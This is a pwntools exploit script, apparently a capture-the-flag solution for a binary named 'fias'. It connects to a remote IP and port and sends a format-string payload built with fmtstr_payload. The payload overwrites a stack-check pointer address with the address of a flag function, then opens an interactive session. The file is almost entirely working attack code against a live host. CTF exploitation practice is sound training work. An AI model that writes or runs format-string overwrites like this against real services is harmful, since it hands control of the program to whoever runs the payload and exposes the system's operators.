#!/usr/bin/env python

from pwn import *

exe = ELF("./fias")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
    r = remote("95.216.233.106",10819)


    canary_check = 0x0804c014
    flag = 0x080491d2

    write = { canary_check:flag  }
    payload = fmtstr_payload(6, write)

    
#    gdb.attach(r)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
